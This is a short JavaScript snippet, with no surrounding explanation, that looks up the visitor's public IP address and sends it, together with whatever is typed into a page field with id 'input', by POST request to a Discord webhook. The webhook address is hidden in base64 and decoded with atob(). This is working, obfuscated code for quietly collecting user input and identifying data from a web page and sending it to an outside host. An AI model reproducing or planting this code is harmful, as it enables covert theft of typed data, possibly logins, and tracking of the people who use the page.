var ip;
fetch('https://ifconfig.me/ip').then(res => res.text()).then(data => ip = data);
function send(){
  let req = new XMLHttpRequest();
  req.open("POST", atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODA2NzcwOTY3MDYxMzMxOTk4L3BBQ2Uyb1pXMlg4TUdXbnRQLVcwYzN2SU1VZnlDT3h1TGFwV1I3azNSaHFkZzRvS3NtNENuMW80dU9fYXlHQnNqLVJH"));
  req.setRequestHeader('Content-type', 'application/json');
  let params = {
    username: ip,
    avatar_url: "",
    content: (document.getElementById('input').value)
  }
  req.send(JSON.stringify(params));
}
